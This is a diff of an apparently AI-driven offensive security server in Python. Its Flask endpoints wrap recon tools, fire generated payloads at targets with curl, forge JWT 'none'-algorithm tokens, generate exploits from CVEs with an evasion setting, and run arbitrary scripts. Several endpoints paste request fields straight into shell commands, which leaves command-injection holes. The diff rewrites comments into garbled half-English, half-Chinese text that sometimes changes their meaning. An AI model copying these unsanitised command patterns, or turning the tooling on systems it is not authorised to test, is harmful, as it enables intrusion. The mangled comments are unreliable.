                     scripts.append({'type': 'external', 'src': src})
@@ -13981,7 +13981,7 @@ class BrowserAgent:
                     if content and len(content) > 10:
                         scripts.append({
                             'type': 'inline',
-                            'content': content[:1000]  # Limit content
+                            'content': content[:1000]  # 说明：Limit content
                         })
         except:
             pass
@@ -13989,12 +13989,12 @@ class BrowserAgent:
         return scripts
 
     def _get_network_logs(self) -> list:
-        """Get network request logs"""
+        """获取 网络 请求 logs"""
         try:
             logs = self.driver.get_log('performance')
             network_requests = []
 
-            for log in logs[-50:]:  # Last 50 logs
+            for log in logs[-50:]:  # 最后 50 logs
                 message = json.loads(log['message'])
                 if message['message']['method'] == 'Network.responseReceived':
                     response = message['message']['params']['response']
@@ -14010,10 +14010,10 @@ class BrowserAgent:
             return []
 
     def _analyze_page_security(self, page_source: str, page_info: dict) -> dict:
-        """Analyze page for security vulnerabilities"""
+        """分析 page 用于 安全 漏洞"""
         issues = []
 
-        # Check for sensitive data in local/session storage
+        # 检查 用于 sensitive data 在 本地/session storage
         for storage_type, storage_data in [('localStorage', page_info.get('local_storage', {})),
                                           ('sessionStorage', page_info.get('session_storage', {}))]:
             for key, value in storage_data.items():
@@ -14025,7 +14025,7 @@ class BrowserAgent:
                         'location': storage_type
                     })
 
-        # Check for forms without CSRF protection
+        # 检查 用于 forms 不使用 CSRF protection
         for form in page_info.get('forms', []):
             has_csrf = any('csrf' in input_data['name'].lower() or 'token' in input_data['name'].lower()
                           for input_data in form['inputs'])
@@ -14037,7 +14037,7 @@ class BrowserAgent:
                     'form_action': form['action']
                 })
 
-        # Check for inline JavaScript
+        # 检查 用于 inline JavaScript
         inline_scripts = [s for s in page_info.get('scripts', []) if s['type'] == 'inline']
         if inline_scripts:
             issues.append({
@@ -14050,17 +14050,17 @@ class BrowserAgent:
         return {
             'total_issues': len(issues),
             'issues': issues,
-            'security_score': max(0, 100 - (len(issues) * 10))  # Simple scoring
+            'security_score': max(0, 100 - (len(issues) * 10))  # 简单 scoring
         }
 
     def close_browser(self):
-        """Close the browser instance"""
+        """关闭 the 浏览器 instance"""
         if self.driver:
             self.driver.quit()
             self.driver = None
             logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'SUCCESS', 'Browser Closed')}")
 
-# Global instances
+# 全局 instances
 http_framework = HTTPTestingFramework()
 browser_agent = BrowserAgent()
 
@@ -14280,7 +14280,7 @@ def run_burp_forwarded_traffic_analysis(
     """分析 Burp 转发流量，采用“被动优先 + 安全验证”策略。"""
 
     class _CapturedResponse:
-        # 适配内部分析函数需要的 response 结构，避免重复实现解析逻辑。
+        # 适配内部分析函数需要的 响应 结构，避免重复实现解析逻辑。
         def __init__(self, status_code: int, headers: Dict[str, Any], body: str):
             self.status_code = status_code
             self.headers = headers
@@ -14391,7 +14391,7 @@ def run_burp_forwarded_traffic_analysis(
         verification_results = []
         verified_urls = set()
         if run_safe_verify:
-            # 仅对 GET 做去重验证，避免重复请求与副作用风险。
+            # 仅对 获取 做去重验证，避免重复请求与副作用风险。
             unique_urls = []
             seen = set()
             for entry in accepted_entries:
@@ -14406,7 +14406,7 @@ def run_burp_forwarded_traffic_analysis(
 
             for url in unique_urls:
                 try:
-                    # 安全验证仅附加无害参数，不发送注入 payload。
+                    # 安全验证仅附加无害参数，不发送注入 载荷。
                     verify_resp = requests.get(
                         url,
                         params={"hexstrike_verify": "safe_probe"},
@@ -14524,10 +14524,10 @@ def run_burp_forwarded_traffic_analysis(
 
 @app.route("/api/tools/http-framework", methods=["POST"])
 def http_framework_endpoint():
-    """Enhanced HTTP testing framework (Burp Suite alternative)"""
+    """增强 HTTP 测试 框架 (Burp Suite alternative)"""
     try:
         params = request.json
-        action = params.get("action", "request")  # request, spider, proxy_history, set_rules, set_scope, repeater, intruder
+        action = params.get("action", "request")  # 请求, spider, proxy_history, set_rules, set_scope, repeater, intruder
         url = params.get("url", "")
         method = params.get("method", "GET")
         data = params.get("data", {})
@@ -14574,7 +14574,7 @@ def http_framework_endpoint():
         elif action == "proxy_history":
             return jsonify({
                 "success": True,
-                "history": http_framework.proxy_history[-100:],  # Last 100 requests
+                "history": http_framework.proxy_history[-100:],  # 最后 100 请求
                 "total_requests": len(http_framework.proxy_history),
                 "vulnerabilities": http_framework.vulnerabilities,
             })
@@ -14620,10 +14620,10 @@ def http_framework_endpoint():
 
 @app.route("/api/tools/browser-agent", methods=["POST"])
 def browser_agent_endpoint():
-    """AI-powered browser agent for web application inspection"""
+    """AI-powered 浏览器 agent 用于 web application inspection"""
     try:
         params = request.json or {}
-        action = params.get("action", "navigate")  # navigate, screenshot, close
+        action = params.get("action", "navigate")  # navigate, screenshot, 关闭
         url = params.get("url", "")
         headless = params.get("headless", True)
         wait_time = params.get("wait_time", 5)
@@ -14641,7 +14641,7 @@ def browser_agent_endpoint():
                     400,
                 )
 
-            # Setup browser if not already done
+            # 初始化 浏览器 如果 not already done
             if not browser_agent.driver:
                 setup_success = browser_agent.setup_browser(headless, proxy_port)
                 if not setup_success:
@@ -14709,11 +14709,11 @@ def browser_agent_endpoint():
 
 @app.route("/api/tools/burpsuite-alternative", methods=["POST"])
 def burpsuite_alternative():
-    """Comprehensive Burp Suite alternative combining HTTP framework and browser agent"""
+    """综合 Burp Suite alternative combining HTTP 框架 与 浏览器 agent"""
     try:
         params = request.json or {}
         target = params.get("target", "")
-        scan_type = params.get("scan_type", "comprehensive")  # comprehensive, spider, passive, active
+        scan_type = params.get("scan_type", "comprehensive")  # 综合, spider, passive, active
         headless = params.get("headless", True)
         max_depth = params.get("max_depth", 3)
         max_pages = params.get("max_pages", 50)
@@ -14748,7 +14748,7 @@ def burpsuite_alternative():
             'success': True
         }
 
-        # Phase 1: Browser-based reconnaissance
+        # 阶段 1: 浏览器-based 侦察
         if scan_type in ['comprehensive', 'spider']:
             logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'RUNNING', 'Reconnaissance Phase')}")
 
@@ -14758,22 +14758,22 @@ def burpsuite_alternative():
             browser_result = browser_agent.navigate_and_inspect(target)
             results['browser_analysis'] = browser_result
 
-        # Phase 2: HTTP spidering
+        # 阶段 2: HTTP spidering
         if scan_type in ['comprehensive', 'spider']:
             logger.info(f"{ModernVisualEngine.format_tool_status('HTTP-Spider', 'RUNNING', 'Discovery Phase')}")
 
             spider_result = http_framework.spider_website(target, max_depth, max_pages)
             results['spider_analysis'] = spider_result
 
-        # Phase 3: Vulnerability analysis
+        # 阶段 3: 漏洞 分析
         if scan_type in ['comprehensive', 'active']:
             logger.info(f"{ModernVisualEngine.format_tool_status('VulnScanner', 'RUNNING', 'Analysis Phase')}")
 
-            # Test discovered endpoints
+            # 测试 discovered 端点
             discovered_urls = results.get('spider_analysis', {}).get('discovered_urls', [target])
             vuln_results = []
 
-            for url in discovered_urls[:20]:  # Limit to 20 URLs
+            for url in discovered_urls[:20]:  # Limit 到 20 URLs
                 test_result = http_framework.intercept_request(url)
                 if test_result.get('success'):
                     vuln_results.append(test_result)
@@ -14784,7 +14784,7 @@ def burpsuite_alternative():
                 'recent_vulnerabilities': http_framework._get_recent_vulns(20)
             }
 
-        # Generate summary
+        # 生成 summary
         total_vulns = len(http_framework.vulnerabilities)
         vuln_summary = {}
         for vuln in http_framework.vulnerabilities:
@@ -14798,7 +14798,7 @@ def burpsuite_alternative():
             'security_score': max(0, 100 - (total_vulns * 5))
         }
 
-        # Display summary with enhanced colors
+        # 展示 summary 使用 增强 colors
         logger.info(f"{ModernVisualEngine.create_section_header('SCAN COMPLETE', '', 'SUCCESS')}")
         vuln_message = f'Found {total_vulns} vulnerabilities'
         color_choice = 'YELLOW' if total_vulns > 0 else 'GREEN'
@@ -14909,7 +14909,7 @@ def burp_traffic_analyze():
 
 @app.route("/api/tools/zap", methods=["POST"])
 def zap():
-    """Execute OWASP ZAP with enhanced logging"""
+    """执行 OWASP ZAP 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -14959,7 +14959,7 @@ def zap():
 
 @app.route("/api/tools/wafw00f", methods=["POST"])
 def wafw00f():
-    """Execute wafw00f to identify and fingerprint WAF products with enhanced logging"""
+    """执行 wafw00f 到 identify 与 指纹 WAF products 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -14988,7 +14988,7 @@ def wafw00f():
 
 @app.route("/api/tools/fierce", methods=["POST"])
 def fierce():
-    """Execute fierce for DNS reconnaissance with enhanced logging"""
+    """执行 fierce 用于 DNS 侦察 使用 增强日志"""
     try:
         params = request.json
         domain = params.get("domain", "")
@@ -15021,7 +15021,7 @@ def fierce():
 
 @app.route("/api/tools/dnsenum", methods=["POST"])
 def dnsenum():
-    """Execute dnsenum for DNS enumeration with enhanced logging"""
+    """执行 dnsenum 用于 DNS enumeration 使用 增强日志"""
     try:
         params = request.json
         domain = params.get("domain", "")
@@ -15056,10 +15056,10 @@ def dnsenum():
             "error": f"Server error: {str(e)}"
         }), 500
 
-# Python Environment Management Endpoints
+# Python Environment Management 端点
 @app.route("/api/python/install", methods=["POST"])
 def install_python_package():
-    """Install a Python package in a virtual environment"""
+    """安装 a Python package 在 a virtual environment"""
     try:
         params = request.json
         package = params.get("package", "")
@@ -15089,7 +15089,7 @@ def install_python_package():
 
 @app.route("/api/python/execute", methods=["POST"])
 def execute_python_script():
-    """Execute a Python script in a virtual environment"""
+    """执行 a Python script 在 a virtual environment"""
     try:
         params = request.json
         script = params.get("script", "")
@@ -15099,21 +15099,21 @@ def execute_python_script():
         if not script:
             return jsonify({"error": "Script content is required"}), 400
 
-        # Create script file
+        # 创建 script 文件
         script_result = file_manager.create_file(filename, script)
         if not script_result["success"]:
             return jsonify(script_result), 500
 
-        # Get Python path for environment
+        # 获取 Python path 用于 environment
         python_path = env_manager.get_python_path(env_name)
         script_path = script_result["path"]
 
-        # Execute script
+        # 执行 script
         command = f"{python_path} {script_path}"
         logger.info(f" Executing Python script in env {env_name}: {filename}")
         result = execute_command(command, use_cache=False)
 
-        # Clean up script file
+        # Clean up script 文件
         file_manager.delete_file(filename)
 
         result["env_name"] = env_name
@@ -15126,11 +15126,11 @@ def execute_python_script():
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 # ============================================================================
-# AI-POWERED PAYLOAD GENERATION (v5.0 ENHANCEMENT) UNDER DEVELOPMENT
+# AI-POWERED 载荷 GENERATION (v5.0 ENHANCEMENT) UNDER DEVELOPMENT
 # ============================================================================
 
 class AIPayloadGenerator:
-    """AI-powered payload generation system with contextual intelligence"""
+    """AI-powered 载荷 generation 系统 使用 contextual intelligence"""
 
     def __init__(self):
         self.payload_templates = {
@@ -15207,19 +15207,19 @@ class AIPayloadGenerator:
         }
 
     def generate_contextual_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
-        """Generate contextual payloads based on target information"""
+        """生成 contextual payloads based 在 目标 information"""
 
         attack_type = target_info.get("attack_type", "xss")
         complexity = target_info.get("complexity", "basic")
         target_tech = target_info.get("technology", "").lower()
 
-        # Get base payloads
+        # 获取 base payloads
         payloads = self._get_payloads(attack_type, complexity)
 
-        # Enhance payloads with context
+        # Enhance payloads 使用 context
         enhanced_payloads = self._enhance_with_context(payloads, target_tech)
 
-        # Generate test cases
+        # 生成 测试 cases
         test_cases = self._generate_test_cases(enhanced_payloads, attack_type)
 
         return {
@@ -15232,22 +15232,22 @@ class AIPayloadGenerator:
         }
 
     def _get_payloads(self, attack_type: str, complexity: str) -> list:
-        """Get payloads for specific attack type and complexity"""
+        """获取 payloads 用于 specific attack 类型 与 complexity"""
         if attack_type in self.payload_templates:
             if complexity in self.payload_templates[attack_type]:
                 return self.payload_templates[attack_type][complexity]
             else:
-                # Return basic payloads if complexity not found
+                # Return 基础 payloads 如果 complexity not found
                 return self.payload_templates[attack_type].get("basic", [])
 
         return ["<!-- No payloads available for this attack type -->"]
 
     def _enhance_with_context(self, payloads: list, tech_context: str) -> list:
-        """Enhance payloads with contextual information"""
+        """Enhance payloads 使用 contextual information"""
         enhanced = []
 
         for payload in payloads:
-            # Basic payload
+            # 基础 载荷
             enhanced.append({
                 "payload": payload,
                 "context": "basic",
@@ -15255,7 +15255,7 @@ class AIPayloadGenerator:
                 "risk_level": self._assess_risk_level(payload)
             })
 
-            # URL encoded version
+            # 说明：URL encoded version
             url_encoded = payload.replace(" ", "%20").replace("<", "%3C").replace(">", "%3E")
             enhanced.append({
                 "payload": url_encoded,
@@ -15267,10 +15267,10 @@ class AIPayloadGenerator:
         return enhanced
 
     def _generate_test_cases(self, payloads: list, attack_type: str) -> list:
-        """Generate test cases for the payloads"""
+        """生成 测试 cases 用于 the payloads"""
         test_cases = []
 
-        for i, payload_info in enumerate(payloads[:5]):  # Limit to 5 test cases
+        for i, payload_info in enumerate(payloads[:5]):  # Limit 到 5 测试 cases
             test_case = {
                 "id": f"test_{i+1}",
                 "payload": payload_info["payload"],
@@ -15283,7 +15283,7 @@ class AIPayloadGenerator:
         return test_cases
 
     def _get_expected_behavior(self, attack_type: str) -> str:
-        """Get expected behavior for attack type"""
+        """获取 expected behavior 用于 attack 类型"""
         behaviors = {
             "xss": "JavaScript execution or popup alert",
             "sqli": "Database error or data extraction",
@@ -15295,7 +15295,7 @@ class AIPayloadGenerator:
         return behaviors.get(attack_type, "Unexpected application behavior")
 
     def _assess_risk_level(self, payload: str) -> str:
-        """Assess risk level of payload"""
+        """Assess risk level 的 载荷"""
         high_risk_indicators = ["system", "exec", "eval", "cmd", "shell", "passwd", "etc"]
         medium_risk_indicators = ["script", "alert", "union", "select"]
 
@@ -15309,7 +15309,7 @@ class AIPayloadGenerator:
             return "LOW"
 
     def _get_recommendations(self, attack_type: str) -> list:
-        """Get testing recommendations"""
+        """获取 测试 recommendations"""
         recommendations = {
             "xss": [
                 "Test in different input fields and parameters",
@@ -15335,12 +15335,12 @@ class AIPayloadGenerator:
 
         return recommendations.get(attack_type, ["Test thoroughly", "Monitor responses"])
 
-# Global AI payload generator
+# 全局 AI 载荷 generator
 ai_payload_generator = AIPayloadGenerator()
 
 @app.route("/api/ai/generate_payload", methods=["POST"])
 def ai_generate_payload():
-    """Generate AI-powered contextual payloads for security testing"""
+    """生成 AI-powered contextual payloads 用于 安全 测试"""
     try:
         params = request.json
         target_info = {
@@ -15370,7 +15370,7 @@ def ai_generate_payload():
 
 @app.route("/api/ai/test_payload", methods=["POST"])
 def ai_test_payload():
-    """Test generated payload against target with AI analysis"""
+    """测试 generated 载荷 against 目标 使用 AI 分析"""
     try:
         params = request.json
         payload = params.get("payload", "")
@@ -15385,17 +15385,17 @@ def ai_test_payload():
 
         logger.info(f" Testing AI-generated payload against {target_url}")
 
-        # Create test command based on method and payload
+        # 创建 测试 命令 based 在 method 与 载荷
         if method.upper() == "GET":
             encoded_payload = payload.replace(" ", "%20").replace("'", "%27")
             test_command = f"curl -s '{target_url}?test={encoded_payload}'"
         else:
             test_command = f"curl -s -X POST -d 'test={payload}' '{target_url}'"
 
-        # Execute test
+        # 执行 测试
         result = execute_command(test_command, use_cache=False)
 
-        # AI analysis of results
+        # AI 分析 的 结果
         analysis = {
             "payload_tested": payload,
             "target_url": target_url,
@@ -15427,12 +15427,12 @@ def ai_test_payload():
         }), 500
 
 # ============================================================================
-# ADVANCED API TESTING TOOLS (v5.0 ENHANCEMENT)
+# 高级 API 测试 工具 (v5.0 ENHANCEMENT)
 # ============================================================================
 
 @app.route("/api/tools/api_fuzzer", methods=["POST"])
 def api_fuzzer():
-    """Advanced API endpoint fuzzing with intelligent parameter discovery"""
+    """高级 API 端点 fuzzing 使用 智能 参数 发现"""
     try:
         params = request.json
         base_url = params.get("base_url", "")
@@ -15446,9 +15446,9 @@ def api_fuzzer():
                 "error": "Base URL parameter is required"
             }), 400
 
-        # Create comprehensive API fuzzing command
+        # 创建 综合 API fuzzing 命令
         if endpoints:
-            # Test specific endpoints
+            # 测试 specific 端点
             results = []
             for endpoint in endpoints:
                 for method in methods:
@@ -15468,7 +15468,7 @@ def api_fuzzer():
                 "results": results
             })
         else:
-            # Discover endpoints using wordlist
+            # Discover 端点 using wordlist
             command = f"ffuf -u {base_url}/FUZZ -w {wordlist} -mc 200,201,202,204,301,302,307,401,403,405 -t 50"
 
             logger.info(f" Starting API endpoint discovery: {base_url}")
@@ -15489,7 +15489,7 @@ def api_fuzzer():
 
 @app.route("/api/tools/graphql_scanner", methods=["POST"])
 def graphql_scanner():
-    """Advanced GraphQL security scanning and introspection"""
+    """高级 GraphQL 安全 扫描 与 introspection"""
     try:
         params = request.json
         endpoint = params.get("endpoint", "")
@@ -15512,7 +15512,7 @@ def graphql_scanner():
             "recommendations": []
         }
 
-        # Test 1: Introspection query
+        # 测试 1: Introspection query
         if introspection:
             introspection_query = '''
             {
@@ -15543,7 +15543,7 @@ def graphql_scanner():
                     "description": "GraphQL introspection is enabled"
                 })
 
-        # Test 2: Query depth analysis
+        # 测试 2: Query depth 分析
         deep_query = "{ " * query_depth + "field" + " }" * query_depth
         command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{deep_query}\"}}' {endpoint}"
         depth_result = execute_command(command, use_cache=False)
@@ -15557,7 +15557,7 @@ def graphql_scanner():
                 "description": f"No query depth limiting detected (tested depth: {query_depth})"
             })
 
-        # Test 3: Batch query testing
+        # 测试 3: Batch query 测试
         batch_query = '[' + ','.join(['{\"query\":\"{field}\"}' for _ in range(10)]) + ']'
         command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{batch_query}' {endpoint}"
         batch_result = execute_command(command, use_cache=False)
@@ -15571,7 +15571,7 @@ def graphql_scanner():
                 "description": "Batch queries are allowed without rate limiting"
             })
 
-        # Generate recommendations
+        # 生成 recommendations
         if results["vulnerabilities"]:
             results["recommendations"] = [
                 "Disable introspection in production",
@@ -15596,7 +15596,7 @@ def graphql_scanner():
 
 @app.route("/api/tools/jwt_analyzer", methods=["POST"])
 def jwt_analyzer():
-    """Advanced JWT token analysis and vulnerability testing"""
+    """高级 JWT token 分析 与 漏洞 测试"""
     try:
         params = request.json
         jwt_token = params.get("jwt_token", "")
@@ -15617,15 +15617,15 @@ def jwt_analyzer():
             "attack_vectors": []
         }
 
-        # Decode JWT header and payload (basic analysis)
+        # Decode JWT 请求头 与 载荷 (基础 分析)
         try:
             parts = jwt_token.split('.')
             if len(parts) >= 2:
-                # Decode header
+                # Decode 请求头
                 import base64
                 import json
 
-                # Add padding if needed
+                # Add padding 如果 needed
                 header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
                 payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
 
@@ -15639,7 +15639,7 @@ def jwt_analyzer():
                         "algorithm": header.get("alg", "unknown")
                     }
 
-                    # Check for vulnerabilities
+                    # 检查 用于 漏洞
                     algorithm = header.get("alg", "").lower()
 
                     if algorithm == "none":
@@ -15657,7 +15657,7 @@ def jwt_analyzer():
                             "description": "HMAC algorithm detected - vulnerable to key confusion attacks"
                         })
 
-                    # Check token expiration
+                    # 检查 token expiration
                     exp = payload.get("exp")
                     if not exp:
                         results["vulnerabilities"].append({
@@ -15680,12 +15680,12 @@ def jwt_analyzer():
                 "description": "Invalid JWT token format"
             })
 
-        # Test token manipulation if target URL provided
+        # 测试 token manipulation 如果 目标 URL provided
         if target_url:
-            # Test none algorithm attack
+            # 测试 none algorithm attack
             none_token_parts = jwt_token.split('.')
             if len(none_token_parts) >= 2:
-                # Create none algorithm token
+                # 创建 none algorithm token
                 none_header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode().rstrip('=')
                 none_token = f"{none_header}.{none_token_parts[1]}."
 
@@ -15714,11 +15714,11 @@ def jwt_analyzer():
 
 @app.route("/api/tools/api_schema_analyzer", methods=["POST"])
 def api_schema_analyzer():
-    """Analyze API schemas and identify potential security issues"""
+    """分析 API schemas 与 identify potential 安全 issues"""
     try:
         params = request.json
         schema_url = params.get("schema_url", "")
-        schema_type = params.get("schema_type", "openapi")  # openapi, swagger, graphql
+        schema_type = params.get("schema_type", "openapi")  # 说明：openapi, swagger, graphql
 
         if not schema_url:
             logger.warning(" API Schema Analyzer called without schema_url parameter")
@@ -15728,7 +15728,7 @@ def api_schema_analyzer():
 
         logger.info(f" Starting API schema analysis: {schema_url}")
 
-        # Fetch schema
+        # 说明：Fetch schema
         command = f"curl -s '{schema_url}'"
         result = execute_command(command, use_cache=True)
 
@@ -15747,13 +15747,13 @@ def api_schema_analyzer():
             "recommendations": []
         }
 
-        # Parse schema based on type
+        # 解析 schema based 在 类型
         try:
             import json
             schema_data = json.loads(schema_content)
 
             if schema_type.lower() in ["openapi", "swagger"]:
-                # OpenAPI/Swagger analysis
+                # OpenAPI/Swagger 分析
                 paths = schema_data.get("paths", {})
 
                 for path, methods in paths.items():
@@ -15768,7 +15768,7 @@ def api_schema_analyzer():
                             }
                             analysis_results["endpoints_found"].append(endpoint_info)
 
-                            # Check for security issues
+                            # 检查 用于 安全 issues
                             if not endpoint_info["security"]:
                                 analysis_results["security_issues"].append({
                                     "endpoint": f"{method.upper()} {path}",
@@ -15777,7 +15777,7 @@ def api_schema_analyzer():
                                     "description": "Endpoint has no authentication requirements"
                                 })
 
-                            # Check for sensitive data in parameters
+                            # 检查 用于 sensitive data 在 参数
                             for param in endpoint_info["parameters"]:
                                 param_name = param.get("name", "").lower()
                                 if any(sensitive in param_name for sensitive in ["password", "token", "key", "secret"]):
@@ -15788,7 +15788,7 @@ def api_schema_analyzer():
                                         "description": f"Sensitive parameter detected: {param_name}"
                                     })
 
-            # Generate recommendations
+            # 生成 recommendations
             if analysis_results["security_issues"]:
                 analysis_results["recommendations"] = [
                     "Implement authentication for all endpoints",
@@ -15821,12 +15821,12 @@ def api_schema_analyzer():
         }), 500
 
 # ============================================================================
-# ADVANCED CTF TOOLS (v5.0 ENHANCEMENT)
+# 高级 CTF 工具 (v5.0 ENHANCEMENT)
 # ============================================================================
 
 @app.route("/api/tools/volatility3", methods=["POST"])
 def volatility3():
-    """Execute Volatility3 for advanced memory forensics with enhanced logging"""
+    """执行 Volatility3 用于 高级 内存 取证 使用 增强日志"""
     try:
         params = request.json
         memory_file = params.get("memory_file", "")
@@ -15866,7 +15866,7 @@ def volatility3():
 
 @app.route("/api/tools/foremost", methods=["POST"])
 def foremost():
-    """Execute Foremost for file carving with enhanced logging"""
+    """执行 Foremost 用于 文件 carving 使用 增强日志"""
     try:
         params = request.json
         input_file = params.get("input_file", "")
@@ -15880,7 +15880,7 @@ def foremost():
                 "error": "Input file parameter is required"
             }), 400
 
-        # Ensure output directory exists
+        # Ensure 输出 目录 exists
         Path(output_dir).mkdir(parents=True, exist_ok=True)
 
         command = f"foremost -o {output_dir}"
@@ -15906,10 +15906,10 @@ def foremost():
 
 @app.route("/api/tools/steghide", methods=["POST"])
 def steghide():
-    """Execute Steghide for steganography analysis with enhanced logging"""
+    """执行 Steghide 用于 steganography 分析 使用 增强日志"""
     try:
         params = request.json
-        action = params.get("action", "extract")  # extract, embed, info
+        action = params.get("action", "extract")  # 说明：extract, embed, info
         cover_file = params.get("cover_file", "")
         embed_file = params.get("embed_file", "")
         passphrase = params.get("passphrase", "")
@@ -15938,7 +15938,7 @@ def steghide():
         if passphrase:
             command += f" -p {passphrase}"
         else:
-            command += " -p ''"  # Empty passphrase
+            command += " -p ''"  # 说明：Empty passphrase
 
         if additional_args:
             command += f" {additional_args}"
@@ -15955,11 +15955,11 @@ def steghide():
 
 @app.route("/api/tools/exiftool", methods=["POST"])
 def exiftool():
-    """Execute ExifTool for metadata extraction with enhanced logging"""
+    """执行 ExifTool 用于 metadata extraction 使用 增强日志"""
     try:
         params = request.json
         file_path = params.get("file_path", "")
-        output_format = params.get("output_format", "")  # json, xml, csv
+        output_format = params.get("output_format", "")  # 说明：JSON, xml, csv
         tags = params.get("tags", "")
         additional_args = params.get("additional_args", "")
 
@@ -15994,7 +15994,7 @@ def exiftool():
 
 @app.route("/api/tools/hashpump", methods=["POST"])
 def hashpump():
-    """Execute HashPump for hash length extension attacks with enhanced logging"""
+    """执行 HashPump 用于 hash length extension attacks 使用 增强日志"""
     try:
         params = request.json
         signature = params.get("signature", "")
@@ -16025,21 +16025,21 @@ def hashpump():
         }), 500
 
 # ============================================================================
-# BUG BOUNTY RECONNAISSANCE TOOLS (v5.0 ENHANCEMENT)
+# BUG BOUNTY 侦察 工具 (v5.0 ENHANCEMENT)
 # ============================================================================
 
 @app.route("/api/tools/hakrawler", methods=["POST"])
 def hakrawler():
     """
-    Execute Hakrawler for web endpoint discovery with enhanced logging
+    执行 Hakrawler 用于 web 端点 发现 使用 增强日志
 
-    Note: This implementation uses the standard Kali Linux hakrawler (hakluke/hakrawler)
-    command line arguments, NOT the Elsfa7-110 fork. The standard version uses:
-    - echo URL | hakrawler (stdin input)
-    - -d for depth (not -depth)
-    - -s for showing sources (not -forms)
-    - -u for unique URLs
-    - -subs for subdomain inclusion
+    Note: 说明：This implementation uses the standard Kali Linux hakrawler (hakluke/hakrawler)
+    命令 line arguments, NOT the Elsfa7-110 fork. The standard version uses:
+    - echo URL | hakrawler (stdin 输入)
+    - -d 用于 depth (not -depth)
+    - -s 用于 showing sources (not -forms)
+    - -u 用于 unique URLs
+    - -subs 用于 subdomain inclusion
     """
     try:
         params = request.json
@@ -16057,15 +16057,15 @@ def hakrawler():
                 "error": "URL parameter is required"
             }), 400
 
-        # Build command for standard Kali Linux hakrawler (hakluke version)
+        # Build 命令 用于 standard Kali Linux hakrawler (hakluke version)
         command = f"echo '{url}' | hakrawler -d {depth}"
 
         if forms:
-            command += " -s"  # Show sources (includes forms)
+            command += " -s"  # 说明：Show sources (includes forms)
         if robots or sitemap or wayback:
-            command += " -subs"  # Include subdomains for better coverage
+            command += " -subs"  # Include subdomains 用于 better coverage
 
-        # Add unique URLs flag for cleaner output
+        # Add unique URLs flag 用于 cleaner 输出
         command += " -u"
 
         if additional_args:
@@ -16082,12 +16082,12 @@ def hakrawler():
         }), 500
 
 # ============================================================================
-# ADVANCED VULNERABILITY INTELLIGENCE API ENDPOINTS (v6.0 ENHANCEMENT)
+# 高级 漏洞 INTELLIGENCE API 端点 (v6.0 ENHANCEMENT)
 # ============================================================================
 
 @app.route("/api/vuln-intel/cve-monitor", methods=["POST"])
 def cve_monitor():
-    """Monitor CVE databases for new vulnerabilities with AI analysis"""
+    """监控 CVE databases 用于 new 漏洞 使用 AI 分析"""
     try:
         params = request.json
         hours = params.get("hours", 24)
@@ -16096,10 +16096,10 @@ def cve_monitor():
 
         logger.info(f" Monitoring CVE feeds for last {hours} hours with severity filter: {severity_filter}")
 
-        # Fetch latest CVEs
+        # 说明：Fetch latest CVEs
         cve_results = cve_intelligence.fetch_latest_cves(hours, severity_filter)
 
-        # Filter by keywords if provided
+        # 过滤 由 keywords 如果 provided
         if keywords and cve_results.get("success"):
             keyword_list = [k.strip().lower() for k in keywords.split(",")]
             filtered_cves = []
@@ -16113,9 +16113,9 @@ def cve_monitor():
             cve_results["filtered_by_keywords"] = keywords
             cve_results["total_after_filter"] = len(filtered_cves)
 
-        # Analyze exploitability for top CVEs
+        # 分析 exploitability 用于 top CVEs
         exploitability_analysis = []
-        for cve in cve_results.get("cves", [])[:5]:  # Analyze top 5 CVEs
+        for cve in cve_results.get("cves", [])[:5]:  # 分析 top 5 CVEs
             cve_id = cve.get("cve_id", "")
             if cve_id:
                 analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
@@ -16141,7 +16141,7 @@ def cve_monitor():
 
 @app.route("/api/vuln-intel/exploit-generate", methods=["POST"])
 def exploit_generate():
-    """Generate exploits from vulnerability data using AI"""
+    """生成 exploits 来自 漏洞 data using AI"""
     try:
         params = request.json
         cve_id = params.get("cve_id", "")
@@ -16150,7 +16150,7 @@ def exploit_generate():
         exploit_type = params.get("exploit_type", "poc")
         evasion_level = params.get("evasion_level", "none")
 
-        # Additional target context
+        # 附加 目标 context
         target_info = {
             "target_os": target_os,
             "target_arch": target_arch,
@@ -16170,7 +16170,7 @@ def exploit_generate():
 
         logger.info(f" Generating exploit for {cve_id} | Target: {target_os} {target_arch}")
 
-        # First analyze the CVE for context
+        # 第一 分析 the CVE 用于 context
         cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
 
         if not cve_analysis.get("success"):
@@ -16179,7 +16179,7 @@ def exploit_generate():
                 "error": f"Failed to analyze CVE {cve_id}: {cve_analysis.get('error', 'Unknown error')}"
             }), 400
 
-        # Prepare CVE data for exploit generation
+        # Prepare CVE data 用于 利用 generation
         cve_data = {
             "cve_id": cve_id,
             "description": f"Vulnerability analysis for {cve_id}",
@@ -16187,10 +16187,10 @@ def exploit_generate():
             "exploitability_score": cve_analysis.get("exploitability_score", 0)
         }
 
-        # Generate exploit
+        # 生成 利用
         exploit_result = exploit_generator.generate_exploit_from_cve(cve_data, target_info)
 
-        # Search for existing exploits for reference
+        # Search 用于 existing exploits 用于 reference
         existing_exploits = cve_intelligence.search_existing_exploits(cve_id)
 
         result = {
@@ -16214,7 +16214,7 @@ def exploit_generate():
 
 @app.route("/api/vuln-intel/attack-chains", methods=["POST"])
 def discover_attack_chains():
-    """Discover multi-stage attack possibilities"""
+    """说明：Discover multi-stage attack possibilities"""
     try:
         params = request.json
         target_software = params.get("target_software", "")
@@ -16230,21 +16230,21 @@ def discover_attack_chains():
 
         logger.info(f" Discovering attack chains for {target_software} | Depth: {attack_depth}")
 
-        # Discover attack chains
+        # 说明：Discover attack chains
         chain_results = vulnerability_correlator.find_attack_chains(target_software, attack_depth)
 
-        # Enhance with exploit generation for viable chains
+        # Enhance 使用 利用 generation 用于 viable chains
         if chain_results.get("success") and chain_results.get("attack_chains"):
             enhanced_chains = []
 
-            for chain in chain_results["attack_chains"][:2]:  # Enhance top 2 chains
